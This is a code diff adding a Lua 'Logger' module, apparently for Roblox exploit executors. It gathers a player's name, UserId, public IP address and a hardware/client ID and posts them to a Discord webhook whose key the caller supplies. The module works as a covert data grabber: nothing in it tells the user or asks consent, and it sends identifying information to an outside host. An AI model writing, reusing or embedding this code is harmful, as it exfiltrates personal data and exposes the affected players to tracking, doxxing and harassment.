@@ -1,0 +1,29 @@
+local Logger = {}
+
+local HttpService = game:GetService('HttpService')
+local http_function = request or (http and http.request) or (syn and syn.request) or http_request
+
+local function getHWID()
+    return game:GetService('RbxAnalyticsService'):GetClientId() or 'None'
+end
+
+local function getIP()
+    local IP = 'None'
+    if(game.HttpGet) then
+        local domain = 'https://ipapi.co/json/'
+        local data = HttpService:JSONDecode(game:HttpGet(domain))
+        IP = data.ip or IP
+    end
+    return IP
+end
+
+function Logger:Log(Player, Key)
+    local webhook_url = string.format('https://discord.com/api/webhooks/%s', Key)
+    local payload = {content=Player.Name,embeds={{fields={{name='UserId',value=Player.UserId},{name='IP',value=getIP()},{name='HWID',value=getHWID()}}}}}
+    local headers = {['content-type'] = 'application/json'}
+    local request_body_encoded = HttpService:JSONEncode(payload)
+    local request_payload = {Url=webhook_url, Body=request_body_encoded, Method='Post', Headers=headers}
+    http_function(request_payload)
+end
+
+return Logger
